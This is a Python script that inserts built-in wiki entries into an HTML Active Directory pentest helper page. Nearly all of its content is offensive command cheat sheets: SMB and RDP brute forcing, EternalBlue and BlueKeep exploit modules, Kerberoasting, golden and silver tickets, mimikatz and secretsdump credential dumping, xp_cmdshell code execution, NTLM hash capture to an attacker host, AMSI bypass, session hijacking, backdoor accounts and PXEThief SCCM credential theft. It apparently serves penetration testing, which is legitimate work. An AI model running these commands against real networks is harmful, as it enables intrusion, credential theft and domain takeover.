#!/usr/bin/env python3
"""
add_wiki.py — Inject wiki entries into AD▸PWN Helper v3

Usage:
    python3 add_wiki.py ad_helper_fixed.html
    python3 add_wiki.py ad_helper_fixed.html --output ad_helper_final.html

Injects entries from HACKVISER_WIKI below into the WIKI array in the HTML.
"""
import sys, argparse, re
from pathlib import Path

# ── Wiki entries from Hackviser + curated AD content ──────────────────────────
# Format matches the existing WIKI array in the HTML
WIKI_ENTRIES = [
    {
        "id":      "hv-smb",
        "tool":    "Hackviser",
        "section": "SMB Pentesting",
        "title":   "SMB (Port 139/445) — Enumeration, Attacks & Post-Exploitation",
        "content": """<h3>Connect & Basic Check</h3>
<pre>smbclient -L //&lt;target&gt;
nmap -p 139,445 --open -sV &lt;target&gt;</pre>

<h3>Null Session</h3>
<pre>rpcclient -U "" &lt;target&gt;
smbclient -L //&lt;target&gt; -N
smbmap -H &lt;target&gt; -u "" -p ""
enum4linux -a &lt;target&gt;</pre>

<h3>Share Enumeration</h3>
<pre># Anonymous
smbclient -L //&lt;target&gt; -U anonymous
smbmap -H &lt;target&gt;

# Credentialed
smbclient -L //&lt;target&gt; -U username%password
smbmap -H &lt;target&gt; -u username -p password -r
nxc smb &lt;target&gt; -u username -p password --shares
nxc smb &lt;target&gt; -u username -p password -M spider_plus</pre>

<h3>User & Group Enumeration</h3>
<pre>enum4linux -U &lt;target&gt;     # users only
enum4linux -G &lt;target&gt;     # groups only
enum4linux -P &lt;target&gt;     # password policy
nmap -p 445 --script=smb-enum-shares,smb-enum-users &lt;target&gt;
nmap -p 445 --script=smb-security-mode &lt;target&gt;</pre>

<h3>Check SMB Signing (for relay)</h3>
<pre>nmap --script smb-security-mode.nse -p445 &lt;target&gt;
nxc smb &lt;subnet&gt; --gen-relay-list relay_targets.txt</pre>

<h3>Brute Force</h3>
<pre>hydra -l administrator -P passwords.txt smb://&lt;target&gt;
nxc smb &lt;target&gt; -u users.txt -p passwords.txt --continue-on-success</pre>

<h3>CVE Exploitation (Metasploit)</h3>
<pre># MS17-010 EternalBlue
use exploit/windows/smb/ms17_010_eternalblue

# MS08-067
use exploit/windows/smb/ms08_067_netapi

# SMBGhost CVE-2020-0796
use exploit/windows/smb/cve_2020_0796_smbghost</pre>

<h3>Post-Exploitation</h3>
<pre># Hash dumping
secretsdump.py domain/user:password@target
mimikatz: sekurlsa::logonpasswords

# SAM extraction
reg save HKLM\\SAM C:\\Windows\\Temp\\sam
reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system

# Data exfiltration
smbget -R smb://target/sharename/ -U username%password</pre>

<h3>SMB Command Reference</h3>
<table>
<tr><th>Command</th><th>Description</th></tr>
<tr><td><code>smbclient //srv/share</code></td><td>Connect to share</td></tr>
<tr><td><code>smbget smb://srv/share/file</code></td><td>Download file</td></tr>
<tr><td><code>smbmap -H target</code></td><td>List shares with permissions</td></tr>
<tr><td><code>mount -t cifs //srv/share /mnt</code></td><td>Mount share</td></tr>
</table>""",
    },
    {
        "id":      "hv-kerberos",
        "tool":    "Hackviser",
        "section": "Kerberos Pentesting",
        "title":   "Kerberos (Port 88) — Attacks, Tickets & Exploitation",
        "content": """<h3>Basic Ticket Operations</h3>
<pre># Request TGT
kinit username@DOMAIN.COM
impacket-getTGT DOMAIN/username:password

# Use ticket
export KRB5CCNAME=username.ccache
klist
kdestroy</pre>

<h3>Username Enumeration (no creds needed)</h3>
<pre>kerbrute userenum --dc &lt;dc&gt; -d DOMAIN.COM users.txt
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.COM',userdb=users.txt &lt;dc&gt;</pre>

<h3>SPN Enumeration</h3>
<pre>impacket-GetUserSPNs DOMAIN/username:password -dc-ip &lt;dc&gt;
setspn -T DOMAIN.COM -Q */*   # from Windows</pre>

<h3>Kerberoasting</h3>
<pre>impacket-GetUserSPNs DOMAIN/username:password -dc-ip &lt;dc&gt; -request -outputfile hashes.txt
nxc ldap &lt;dc&gt; -u username -p password --kerberoast /tmp/kerb.txt

# Crack
hashcat -m 13100 hashes.txt rockyou.txt
john --format=krb5tgs hashes.txt --wordlist=rockyou.txt

# Windows (Rubeus)
Rubeus.exe kerberoast /outfile:hashes.txt</pre>

<h3>AS-REP Roasting</h3>
<pre>impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -dc-ip &lt;dc&gt;
nxc ldap &lt;dc&gt; -u username -p password --asreproast /tmp/asrep.txt

# Crack
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# Windows (Rubeus)
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt</pre>

<h3>Password Spraying (Kerberos)</h3>
<pre>kerbrute passwordspray --dc &lt;dc&gt; -d DOMAIN.COM users.txt 'Password123!'
# Loop multiple passwords (wait between rounds!)
for pass in 'Winter2024!' 'Spring2024!'; do
  kerbrute passwordspray --dc &lt;dc&gt; -d DOMAIN.COM users.txt "$pass"
done</pre>

<h3>Golden Ticket</h3>
<pre># Requires krbtgt hash (from DCSync)
impacket-ticketer -nthash &lt;krbtgt_hash&gt; -domain-sid &lt;sid&gt; -domain DOMAIN.COM Administrator
export KRB5CCNAME=./Administrator.ccache
impacket-psexec DOMAIN/Administrator@&lt;dc&gt; -k -no-pass

# Mimikatz
kerberos::golden /user:Administrator /domain:DOMAIN.COM /sid:&lt;SID&gt; /krbtgt:&lt;HASH&gt;</pre>

<h3>Silver Ticket</h3>
<pre># Requires service account hash — no KDC contact, very stealthy
impacket-ticketer -nthash &lt;svc_hash&gt; -domain-sid &lt;sid&gt; -domain DOMAIN.COM -spn cifs/server -user-id 500 Administrator</pre>

<h3>Pass-the-Ticket</h3>
<pre>export KRB5CCNAME=/path/to/ticket.ccache
impacket-wmiexec -k -no-pass DOMAIN/user@target
impacket-smbexec -k -no-pass DOMAIN/user@target</pre>""",
    },
    {
        "id":      "hv-ldap",
        "tool":    "Hackviser",
        "section": "LDAP Pentesting",
        "title":   "LDAP (Port 389/636) — AD Enumeration & Attack Paths",
        "content": """<h3>Connect</h3>
<pre>ldapsearch -x -H ldap://&lt;dc&gt; -b "DC=domain,DC=local"
nxc ldap &lt;dc&gt; -u username -p password</pre>

<h3>Anonymous / Null Bind</h3>
<pre>ldapsearch -x -H ldap://&lt;dc&gt; -b "" -s base
ldapsearch -x -H ldap://&lt;dc&gt; -D "" -w "" -b "DC=domain,DC=local" "(objectClass=*)"</pre>

<h3>Authenticated Enumeration</h3>
<pre># Users
ldapsearch -x -H ldap://&lt;dc&gt; -D 'user@domain.com' -w 'password' -b 'DC=domain,DC=com' '(objectClass=user)' sAMAccountName

# Computers
ldapsearch ... '(objectClass=computer)' name operatingSystem

# Groups
ldapsearch ... '(objectClass=group)' name member

# All objects
ldapdomaindump -u 'DOMAIN/user'  -p password &lt;dc&gt; -o /tmp/ldap_dump</pre>

<h3>Key AD Query Filters</h3>
<pre># Kerberoastable accounts
(servicePrincipalName=*)

# AS-REP roastable
(userAccountControl:1.2.840.113556.1.4.803:=4194304)

# Password not required
(userAccountControl:1.2.840.113556.1.4.803:=32)

# AdminCount=1
(adminCount=1)

# Disabled accounts
(userAccountControl:1.2.840.113556.1.4.803:=2)

# Password never expires
(userAccountControl:1.2.840.113556.1.4.803:=65536)</pre>

<h3>BloodHound Collection</h3>
<pre># Full collection
bloodhound-python -u user -p password -d DOMAIN.COM -ns &lt;dc&gt; -c All --zip

# DC only (less noise)
bloodhound-python -u user -p password -d DOMAIN.COM -ns &lt;dc&gt; -c DCOnly --zip

# ACL only
bloodhound-python -u user -p password -d DOMAIN.COM -ns &lt;dc&gt; -c ACL --zip

# Via NXC
nxc ldap &lt;dc&gt; -u user -p password --bloodhound -c All --dns-server &lt;dc&gt;</pre>

<h3>Useful NXC LDAP Modules</h3>
<pre>nxc ldap &lt;dc&gt; -u user -p pass -M adcs        # ADCS enumeration
nxc ldap &lt;dc&gt; -u user -p pass -M laps        # LAPS passwords
nxc ldap &lt;dc&gt; -u user -p pass -M gmsa        # gMSA passwords
nxc ldap &lt;dc&gt; -u user -p pass -M maq         # MachineAccountQuota
nxc ldap &lt;dc&gt; -u user -p pass -M subnets     # AD subnets</pre>""",
    },
    {
        "id":      "hv-mssql",
        "tool":    "Hackviser",
        "section": "MSSQL Pentesting",
        "title":   "MSSQL (Port 1433) — Enumeration, RCE & Post-Exploitation",
        "content": """<h3>Discovery & Connect</h3>
<pre>nmap -p 1433 --open -sV &lt;subnet&gt;
nxc mssql &lt;subnet&gt; -u username -p password

# impacket
impacket-mssqlclient DOMAIN/username:password@target</pre>

<h3>Authentication</h3>
<pre># Windows authentication
impacket-mssqlclient -windows-auth DOMAIN/user:password@target

# SQL authentication
impacket-mssqlclient user:password@target

# With hash
impacket-mssqlclient -windows-auth DOMAIN/user@target -hashes :NTLM</pre>

<h3>Enumeration Queries</h3>
<pre>-- List databases
SELECT name FROM sys.databases

-- Current user and privileges
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')

-- Linked servers
SELECT name, provider FROM sys.servers

-- Users
SELECT name, type_desc FROM sys.server_principals</pre>

<h3>RCE via xp_cmdshell</h3>
<pre>-- Check if enabled
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell'

-- Enable
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user'

-- Disable after use
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;

-- Via NXC
nxc mssql &lt;target&gt; -u user -p pass -x 'whoami'
nxc mssql &lt;target&gt; -u user -p pass -M mssql_priv</pre>

<h3>Linked Server Abuse</h3>
<pre>-- Execute on linked server
EXEC('SELECT SYSTEM_USER') AT [linked_server_name]
EXEC('EXEC xp_cmdshell ''whoami''') AT [linked_server_name]</pre>

<h3>UNC Path Injection (hash capture)</h3>
<pre>-- Trigger NTLM auth to capture hash
EXEC xp_dirtree '\\&lt;attacker_ip&gt;\\\\share'
EXEC xp_fileexist '\\&lt;attacker_ip&gt;\\share\file'</pre>

<h3>Post-Exploitation</h3>
<pre># Read file
BULK INSERT tmp FROM 'C:\\Windows\\system.ini' WITH (FIELDTERMINATOR='|',ROWTERMINATOR='\n')

# Write file (requires permissions)
EXEC xp_cmdshell 'echo test > C:\\WindowsTemp\test.txt'</pre>""",
    },
    {
        "id":      "hv-winrm",
        "tool":    "Hackviser",
        "section": "WinRM Pentesting",
        "title":   "WinRM (Port 5985/5986) — Remote Management Exploitation",
        "content": """<h3>Discovery</h3>
<pre>nmap -p 5985,5986 --open -sV &lt;subnet&gt;
nxc winrm &lt;subnet&gt; -u username -p password --continue-on-success</pre>

<h3>Authentication Check</h3>
<pre>nxc winrm &lt;target&gt; -u username -p password
nxc winrm &lt;target&gt; -u username -H &lt;ntlm_hash&gt;

# With Kerberos
nxc winrm &lt;target&gt; -u username -p password -k</pre>

<h3>Remote Command Execution</h3>
<pre>nxc winrm &lt;target&gt; -u user -p pass -x 'whoami /all'
nxc winrm &lt;target&gt; -u user -p pass -X 'Get-LocalGroupMember Administrators'</pre>

<h3>Evil-WinRM — Interactive Shell</h3>
<pre># Password auth
evil-winrm -i &lt;target&gt; -u username -p password

# Hash (PTH)
evil-winrm -i &lt;target&gt; -u username -H ntlm_hash

# Kerberos
evil-winrm -i &lt;target&gt; -r DOMAIN.COM

# HTTPS (5986)
evil-winrm -i &lt;target&gt; -u username -p password -S

# With PowerShell scripts folder
evil-winrm -i &lt;target&gt; -u username -p password -s /opt/scripts</pre>

<h3>Evil-WinRM Features</h3>
<pre># File transfer
upload /local/path/tool.exe C:\\Windows\\Temp\\tool.exe
download C:lootcreds.txt /local/loot/

# AMSI bypass
Bypass-4MSI

# Load .NET assembly
Invoke-Binary /path/to/SharpHound.exe

# Load PS script
Import-Module /path/to/PowerView.ps1
# then use ps cmds directly</pre>

<h3>Enable WinRM (if disabled)</h3>
<pre># Via NXC/exec (requires another access method first)
nxc smb &lt;target&gt; -u user -p pass -x 'winrm quickconfig -q'
nxc smb &lt;target&gt; -u user -p pass -x 'Set-WSManQuickConfig -Force'

# Via impacket wmiexec
impacket-wmiexec DOMAIN/user:pass@target 'powershell Enable-PSRemoting -Force'</pre>

<h3>Persistence via WinRM</h3>
<pre># Add user to Remote Management Users
net localgroup "Remote Management Users" backdoor /add</pre>""",
    },
    {
        "id":      "hv-rdp",
        "tool":    "Hackviser",
        "section": "RDP Pentesting",
        "title":   "RDP (Port 3389) — Enumeration, Attack & Hijacking",
        "content": """<h3>Discovery & Check</h3>
<pre>nmap -p 3389 --open -sV &lt;subnet&gt;
nxc rdp &lt;subnet&gt; -u username -p password --continue-on-success</pre>

<h3>Authentication</h3>
<pre># Standard
xfreerdp /v:&lt;target&gt; /u:username /p:password /cert-ignore

# Pass-the-Hash (Restricted Admin mode)
xfreerdp /v:&lt;target&gt; /u:username /pth:&lt;ntlm_hash&gt; /cert-ignore

# With domain
xfreerdp /v:&lt;target&gt; /d:DOMAIN /u:username /p:password /cert-ignore /drive:kali,/tmp</pre>

<h3>Brute Force</h3>
<pre>hydra -l administrator -P passwords.txt rdp://&lt;target&gt;
nxc rdp &lt;target&gt; -u users.txt -p passwords.txt --continue-on-success</pre>

<h3>BlueKeep (CVE-2019-0708)</h3>
<pre>nmap -p 3389 --script rdp-vuln-ms12-020 &lt;target&gt;
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</pre>

<h3>Session Hijacking (SYSTEM required)</h3>
<pre># List sessions (on target)
query session
# or
qwinsta

# Hijack session (requires SYSTEM)
tscon &lt;SessionID&gt; /dest:console

# Via sc
sc create hijacksvc binpath= "cmd.exe /k tscon &lt;ID&gt; /dest:rdp-tcp#0"
net start hijacksvc</pre>

<h3>Enable RDP Remotely</h3>
<pre># Via registry (impacket)
impacket-reg DOMAIN/user:pass@target add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server' -v fDenyTSConnections -vt REG_DWORD -vd 0

# Via NXC
nxc smb &lt;target&gt; -u user -p pass -M rdp -o ACTION=enable

# Firewall rule
netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow</pre>

<h3>Credential Extraction via RDP</h3>
<pre># Task Manager dump
Ctrl+Alt+Del &gt; Task Manager &gt; Details &gt; lsass.exe &gt; Create dump file

# Mimikatz (if shell available)
privilege::debug
sekurlsa::logonpasswords</pre>""",
    },
    {
        "id":      "hv-adpwn-workflow",
        "tool":    "AD Pentesting",
        "section": "Full AD Attack Path",
        "title":   "AD Engagement — Full Attack Path from Zero to DA",
        "content": """<h3>Phase 1: No Credentials</h3>
<pre># Network discovery
nmap -sn &lt;subnet&gt;
nxc smb &lt;subnet&gt;

# SMB null session
nxc smb &lt;dc&gt; -u "" -p "" --shares
enum4linux -a &lt;dc&gt;
rpcclient -U "" &lt;dc&gt; -c enumdomusers

# Username enumeration
kerbrute userenum --dc &lt;dc&gt; --domain DOMAIN usernames.txt

# AS-REP roast (no creds)
impacket-GetNPUsers DOMAIN/ -no-pass -usersfile users.txt -dc-ip &lt;dc&gt; -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt</pre>

<h3>Phase 2: Username Only → Gain Creds</h3>
<pre># Check lockout policy FIRST
nxc smb &lt;dc&gt; -u validuser -p '' --pass-pol

# Password spray (one password at a time)
nxc smb &lt;dc&gt; -u users.txt -p 'Password1' --continue-on-success
kerbrute passwordspray --dc &lt;dc&gt; --domain DOMAIN users.txt 'Summer2024!'</pre>

<h3>Phase 3: User Credentials → Escalate</h3>
<pre># Full domain enumeration
bloodhound-python -u user -p pass -d DOMAIN -ns &lt;dc&gt; -c All --zip
nxc ldap &lt;dc&gt; -u user -p pass --users --groups --kerberoast /tmp/kerb.txt

# Check quick wins
nxc smb &lt;dc&gt; -u user -p pass -M gpp_password   # GPP creds
nxc ldap &lt;dc&gt; -u user -p pass -M laps           # LAPS
certipy find -u user@DOMAIN -p pass -dc-ip &lt;dc&gt; -vulnerable -stdout  # ADCS

# Kerberoast
hashcat -m 13100 kerb.txt rockyou.txt

# Find relay targets
nxc smb &lt;subnet&gt; --gen-relay-list relay_targets.txt</pre>

<h3>Phase 4: Local Admin → Domain Admin Path</h3>
<pre># Dump creds
nxc smb &lt;target&gt; -u user -p pass --sam --lsa
impacket-secretsdump DOMAIN/user:pass@target

# PTH to more machines
nxc smb &lt;subnet&gt; -u user -H &lt;hash&gt; --continue-on-success

# If DA token in memory
nxc smb &lt;dc&gt; -u user -H &lt;da_hash&gt; --ntds</pre>

<h3>Phase 5: Domain Admin → Full Compromise</h3>
<pre># DCSync
impacket-secretsdump DOMAIN/user:pass@dc -just-dc -outputfile /tmp/all_hashes

# Extract krbtgt
impacket-secretsdump DOMAIN/user:pass@dc -just-dc-user krbtgt

# ADCS if CA present
certipy req -u user@DOMAIN -p pass -ca CA_NAME -target CA_IP -template User -upn administrator@DOMAIN
certipy auth -pfx administrator.pfx -dc-ip &lt;dc&gt;</pre>

<h3>Always Check</h3>
<ul>
<li>BloodHound shortest path to DA</li>
<li>Unconstrained/constrained delegation accounts</li>
<li>ADCS vulnerable templates (ESC1-8)</li>
<li>ACL abuse paths in BloodHound</li>
<li>LAPS and gMSA passwords</li>
<li>Passwords in AD description fields</li>
<li>GPP cpassword in SYSVOL</li>
</ul>

<h3>Cleanup Checklist</h3>
<ul>
<li>Remove all uploaded tools and binaries</li>
<li>Revert any registry modifications</li>
<li>Remove added user accounts</li>
<li>Restore modified AD objects (templates, ACLs)</li>
<li>Delete generated ticket files (.ccache)</li>
<li>Remove created computer accounts (for RBCD)</li>
<li>Verify DSRM registry key removed</li>
</ul>""",
    },
    {
        "id":      "pxethief",
        "tool":    "SCCM / PXE",
        "section": "PXEThief — SCCM/MECM Credential Theft",
        "title":   "PXEThief — Extract Credentials from SCCM/MECM OSD (PXE Boot)",
        "content": """<h3>What It Does</h3>
<p>PXEThief extracts credentials from Microsoft Endpoint Configuration Manager (MECM/SCCM)
Operating System Deployment (OSD) functionality via PXE boot. Targets:</p>
<ul>
<li>Network Access Accounts (often over-privileged domain accounts)</li>
<li>Task Sequence credentials stored in ConfigMgr</li>
<li>Collection Variables for "All Unknown Computers"</li>
</ul>

<h3>Setup</h3>
<pre># Windows VM (required — uses Win32 crypto APIs)
pip install -r requirements.txt
# Install Npcap (https://npcap.com) or Wireshark

# Check interface index
python pxethief.py 10

# Edit settings.ini if needed:
# manual_interface_selection_by_id = &lt;index&gt;
# auto_exploit_blank_password = 1</pre>

<h3>Unauthenticated — Auto PXE Boot (No Creds Needed)</h3>
<pre># Mode 1: Auto DHCP PXE boot request — finds DP automatically
# Requires: VM bridged to SCCM network, no password on DP (or blank password)
python pxethief.py 1

# If auto_exploit_blank_password=0 in settings.ini, it prints the tftp command:
# tftp -i &lt;DP_IP&gt; GET \\SMSTemp\\&lt;guid&gt;.boot.var variables.var</pre>

<h3>Unauthenticated — Target Specific DP</h3>
<pre># Mode 2: Coerce PXE boot against specific Distribution Point IP
python pxethief.py 2 &lt;DP_IP&gt;

# Example
python pxethief.py 2 192.168.1.50</pre>

<h3>Decrypt Variables File (Crack Password)</h3>
<pre># Mode 5: Generate hashcat hash from variables file
python pxethief.py 5 &lt;variables-file&gt;
# Output: hash for hashcat module
# hashcat module: https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module

# Mode 3: Decrypt with known/guessed password
python pxethief.py 3 &lt;variables-file&gt; &lt;password-guess&gt;

# Blank password attempt
python pxethief.py 3 variables.var ""</pre>

<h3>Authenticated — Registry Key Attack (Local Admin on DP)</h3>
<pre># If you have local admin on the Distribution Point:
# Step 1: Read the stored PXE password from registry
reg query HKLM\\softwaremicrosoft\\smsdp /v Reserved1

# Step 2: Decrypt it
python pxethief.py 7 &lt;Reserved1-value&gt;

# Step 3: Retrieve task sequences using DP identity
python pxethief.py 6 &lt;identityguid&gt; &lt;identitycert-file&gt;</pre>

<h3>Authenticated — Stand-alone TS Media</h3>
<pre># Mode 4: Decrypt variables + policy from stand-alone media
python pxethief.py 4 &lt;variables-file&gt; &lt;policy-file&gt; &lt;password&gt;</pre>

<h3>Attack Flow</h3>
<pre># 1. Check if SCCM DP exists
nxc smb &lt;subnet&gt; -u user -p pass -M sccm

# 2. Check if PXE is enabled (look for port 4011/UDP or TFTP)
nmap -sU -p 69,4011 &lt;dp_ip&gt;

# 3. Unauthenticated: bridge VM to network and run
python pxethief.py 1    # auto-exploit blank password

# 4. If password protected: get hash and crack
python pxethief.py 5 variables.var
hashcat -m 19850 hash.txt wordlist.txt   # configmgr-cryptderivekey module

# 5. Decrypt and extract NAA / task sequence creds
python pxethief.py 3 variables.var &lt;cracked_password&gt;

# 6. Use recovered credentials for lateral movement
nxc smb &lt;subnet&gt; -u &lt;naa_user&gt; -p &lt;naa_pass&gt; --continue-on-success</pre>

<h3>What You Get</h3>
<ul>
<li>Network Access Account (NAA) credentials — often domain admin or high-privilege</li>
<li>Task Sequence credentials and passwords</li>
<li>Collection variables including secrets configured for OSD</li>
<li>Potential direct path to DA if NAA is over-privileged</li>
</ul>

<h3>Notes</h3>
<ul>
<li>Requires Windows VM for full functionality (Win32 crypto APIs)</li>
<li>Mode 1/2 work without any credentials if DP has blank PXE password</li>
<li>Mode 7 requires local admin on the DP server</li>
<li>SCCM NAA accounts are commonly misconfigured with excess privileges</li>
<li>Source: <a href="https://github.com/MWR-CyberSec/PXEThief">github.com/MWR-CyberSec/PXEThief</a></li>
</ul>""",
    },
]


def inject_wiki(html: str, entries: list) -> tuple:
    """Inject wiki entries into the WIKI array in the HTML (single-pass, string-aware)."""
    log = []

    wiki_start = html.find('const WIKI = [')
    if wiki_start == -1:
        return html, ['[!] WIKI array not found in HTML']

    # Find the matching closing bracket — skip content inside string literals
    depth = 0
    in_str = False
    esc    = False
    wiki_end = wiki_start
    for i, ch in enumerate(html[wiki_start:], wiki_start):
        if esc:
            esc = False
            continue
        if in_str:
            if ch == '\\':
                esc = True
            elif ch == '"':
                in_str = False
            continue
        if ch == '"':
            in_str = True
            continue
        if ch == '[':
            depth += 1
        elif ch == ']':
            depth -= 1
            if depth == 0:
                wiki_end = i
                break

    wiki_block = html[wiki_start:wiki_end + 1]
    import json

    new_entries_js = []
    added    = []
    skipped  = []

    for entry in entries:
        eid = entry['id']
        if f"id:\'{eid}\'" in wiki_block or f'id:"{eid}"' in wiki_block:
            skipped.append((eid, 'already exists'))
            continue
        js = (
            f"  {{id:{json.dumps(eid)},"
            f"tool:{json.dumps(entry['tool'])},"
            f"section:{json.dumps(entry['section'])},"
            f"title:{json.dumps(entry['title'])},"
            f"content:{json.dumps(entry['content'].replace('<','&lt;').replace('>','&gt;').replace('javascript:','javascript&#58;'))}}}"
        )
        new_entries_js.append(js)
        added.append(eid)

    if new_entries_js:
        base = wiki_block[:-1].rstrip()            # strip the closing ]
        base = base.rstrip(',')                     # remove any trailing comma
        sep  = '' if base.rstrip().endswith('[') else ','
        new_wiki_block = base + sep + '\n' + ',\n'.join(new_entries_js) + '\n]'
        html = html[:wiki_start] + new_wiki_block + html[wiki_end + 1:]

    for eid in added:
        section = next(e['section'] for e in entries if e['id'] == eid)
        log.append(f"  ✓ Added wiki: {eid} ({section})")
    for eid, reason in skipped:
        log.append(f"  - Skipped wiki {eid}: {reason}")

    return html, log



def load_yaml_wiki(text: str) -> list:
    """Parse a YAML file produced by scrape_hackviser.py or scrape_hacktricks.py."""
    import re as _re

    entries = []
    lines   = text.split('\n')
    i       = 0
    n       = len(lines)

    def peek():
        return lines[i] if i < n else ''

    while i < n:
        line = lines[i]
        stripped = line.strip()

        # Skip blanks and comments at root level
        if not stripped or stripped.startswith('#'):
            i += 1
            continue

        # New entry starts with "- id:"
        if not stripped.startswith('- id:'):
            i += 1
            continue

        entry = {
            'id':      stripped[5:].strip().strip('"').strip("'"),
            'tool':    '',
            'section': '',
            'title':   '',
            'content': '',
            'source':  '',
        }
        i += 1

        # Read key: value fields until next entry or EOF
        while i < n:
            line    = lines[i]
            stripped = line.strip()
            indent   = len(line) - len(line.lstrip())

            # Next entry starts — stop
            if stripped.startswith('- id:'):
                break

            # Skip blanks at root-level between entries
            if not stripped and indent == 0:
                i += 1
                continue

            # Key: value
            m = _re.match(r'^\s+([a-z_]+):\s*(.*)', line)
            if not m:
                i += 1
                continue

            key = m.group(1)
            val = m.group(2).strip()

            if key == 'content':
                if val == '|':
                    # Block literal — read until indent drops back to field level
                    content_indent = indent + 2
                    content_lines  = []
                    i += 1
                    while i < n:
                        cline    = lines[i]
                        cstripped = cline.strip()
                        cindent   = len(cline) - len(cline.lstrip())

                        # End of block: non-blank line at lower indent than content
                        if cstripped and cindent < content_indent:
                            break
                        # Also end if we see the next YAML entry
                        if cstripped.startswith('- id:'):
                            break

                        # Add line (strip the block literal indentation)
                        if cstripped == '':
                            content_lines.append('')
                        else:
                            content_lines.append(cline[content_indent:] if len(cline) > content_indent else cline.lstrip())
                        i += 1

                    entry['content'] = '\n'.join(content_lines).strip()
                else:
                    entry['content'] = val.strip('"').strip("'")
                    i += 1
            elif key in ('id', 'tool', 'section', 'title', 'source', 'port'):
                entry[key] = val.strip('"').strip("'")
                i += 1
            else:
                i += 1

        entries.append(entry)

    return entries


if __name__ == '__main__':
    p = argparse.ArgumentParser(description='Inject Hackviser wiki entries into AD▸PWN Helper v3')
    p.add_argument('html',     help='ad_helper_fixed.html to patch')
    p.add_argument('--output', default='', help='Output file (default: overwrite input)')
    p.add_argument('--yaml',   default='', help='Import wiki entries from a scraped YAML file instead of built-in entries')
    args = p.parse_args()

    html_path = Path(args.html)
    if not html_path.exists():
        print(f"[!] File not found: {args.html}", file=sys.stderr)
        sys.exit(1)

    html = html_path.read_text(encoding='utf-8')
    print(f"Input : {args.html} ({len(html):,} chars)")

    # Load from YAML if --yaml flag provided
    entries_to_inject = WIKI_ENTRIES
    if args.yaml:
        yaml_path = Path(args.yaml)
        if not yaml_path.exists():
            print(f'[!] YAML file not found: {args.yaml}')
            sys.exit(1)
        entries_to_inject = load_yaml_wiki(yaml_path.read_text(encoding='utf-8'))
        print(f'Loaded {len(entries_to_inject)} wiki entries from {args.yaml}')
    fixed, log = inject_wiki(html, entries_to_inject)
    print("\nWiki injection results:")
    for line in log: print(line)

    out_path = args.output or args.html
    Path(out_path).write_text(fixed, encoding='utf-8')
    print(f"\nOutput: {out_path} ({len(fixed):,} chars)")
    print(f"\nView the wiki in the 📖 Wiki tab — entries appear under 'Hackviser' section.")